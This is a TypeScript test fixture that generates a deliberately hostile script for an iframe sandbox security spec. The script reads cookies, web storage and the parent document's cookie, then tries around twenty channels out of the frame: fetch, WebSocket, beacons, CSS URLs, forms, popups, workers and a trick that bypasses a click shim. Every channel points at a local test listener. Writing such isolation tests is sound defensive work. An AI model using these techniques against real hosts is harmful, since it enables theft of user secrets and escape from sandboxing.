/**
 * Spec 011 Security table: a hostile app. On load it tries every way out of
 * the frame listed in FR-018, each to a local listener the spec owns (or the
 * host's own origin), and records what happened in window.__attack. The spec
 * then asserts on the LISTENER's request log, not on what the app reports.
 *
 * It also keeps the port the host handed it (window.__port) so the spec can
 * send hostile protocol messages through it, and logs every host → frame
 * message (window.__omniLog) so the spec can look for tokens in them.
 *
 * `listener` is e.g. http://127.0.0.1:41234, `host` the page's origin.
 */
export function hostileScript(listener: string, host: string): string {
  return `
(function(){
  var L = ${JSON.stringify(listener)};
  var H = ${JSON.stringify(host)};
  var A = window.__attack = { tried: [], errors: {}, secrets: {} };
  window.__omniLog = [];
  window.addEventListener("message", function (e) {
    if (e.ports && e.ports[0] && !window.__port) {
      window.__port = e.ports[0];
      window.__omniLog.push(e.data);
      e.ports[0].addEventListener("message", function (m) { window.__omniLog.push(m.data); });
    }
  });
  function attempt(name, fn) {
    A.tried.push(name);
    try { var r = fn(); if (r && typeof r.catch === "function") r.catch(function(e){ A.errors[name] = String(e); }); }
    catch (e) { A.errors[name] = String(e); }
  }
  // Same-origin secrets: cookie, storage, the parent's document.
  attempt("cookie", function(){ A.secrets.cookie = document.cookie; });
  attempt("localStorage", function(){ A.secrets.localStorage = JSON.stringify(localStorage); });
  attempt("sessionStorage", function(){ A.secrets.sessionStorage = JSON.stringify(sessionStorage); });
  attempt("parentDocument", function(){ A.secrets.parentCookie = parent.document.cookie; });
  attempt("rtc", function(){ A.secrets.rtc = typeof RTCPeerConnection; });

  // The network, every way the spec names.
  attempt("fetch", function(){ return fetch(L + "/v/fetch", { mode: "no-cors" }); });
  attempt("fetch-host-api", function(){ return fetch(H + "/api/apps", { credentials: "include" }); });
  attempt("xhr", function(){ var x = new XMLHttpRequest(); x.open("GET", L + "/v/xhr"); x.send(); });
  attempt("websocket", function(){ var W = window["Web" + "Socket"]; new W(L.replace("http", "ws") + "/v/ws"); });
  attempt("eventsource", function(){ new EventSource(L + "/v/eventsource"); });
  attempt("beacon", function(){ navigator.sendBeacon(L + "/v/beacon", "x"); });
  attempt("img", function(){ var i = new Image(); i.src = L + "/v/img"; document.body.appendChild(i); });
  attempt("img-tag", function(){ document.body.insertAdjacentHTML("beforeend", '<img alt="" src="' + L + '/v/img-tag">'); });
  attempt("css-url", function(){
    var s = document.createElement("style");
    s.textContent = "#css-probe{background:url(" + L + "/v/css-url)} @import url(" + L + "/v/css-import); @font-face{font-family:x;src:url(" + L + "/v/css-font)} #css-probe{font-family:x}";
    document.head.appendChild(s);
    var d = document.createElement("div"); d.id = "css-probe"; d.textContent = "x"; document.body.appendChild(d);
  });
  attempt("link-prefetch", function(){ var l = document.createElement("link"); l.rel = "prefetch"; l.href = L + "/v/prefetch"; document.head.appendChild(l); });
  attempt("form", function(){
    var f = document.createElement("form"); f.method = "post"; f.action = L + "/v/form";
    var i = document.createElement("input"); i.name = "x"; i.value = "1"; f.appendChild(i);
    document.body.appendChild(f); f.submit();
  });
  attempt("window-open", function(){ A.secrets.popup = String(window.open(L + "/v/window-open")); });
  attempt("target-blank", function(){
    var a = document.createElement("a"); a.href = L + "/v/target-blank"; a.target = "_blank"; a.textContent = "x";
    document.body.appendChild(a);
    // Around the shim, which would route the click through the host: a
    // window capture listener runs before its document one.
    var stop = function (e) { if (e.target === a) e.stopImmediatePropagation(); };
    window.addEventListener("click", stop, true);
    a.click();
    window.removeEventListener("click", stop, true);
  });
  attempt("top-navigation", function(){ top.location.href = L + "/v/top-navigation"; });
  attempt("nested-iframe", function(){ var f = document.createElement("iframe"); f.src = L + "/v/nested-iframe"; document.body.appendChild(f); });
  attempt("worker", function(){ new Worker(L + "/v/worker.js"); });
  attempt("blob-worker", function(){
    var src = "fetch(" + JSON.stringify(L + "/v/blob-worker") + ")";
    new Worker(URL.createObjectURL(new Blob([src], { type: "text/javascript" })));
  });
  attempt("object", function(){ var o = document.createElement("object"); o.data = L + "/v/object"; document.body.appendChild(o); });
  attempt("audio", function(){ var a = new Audio(L + "/v/audio"); a.play().catch(function(){}); });

  setTimeout(function(){ document.body.setAttribute("data-attacked", "1"); }, 300);
})();
`;
}

/** Run last, from the spec: the frame tries to navigate itself away. */
export function selfNavigateScript(listener: string): string {
  return `location.href = ${JSON.stringify(listener + "/v/self-navigation")};`;
}
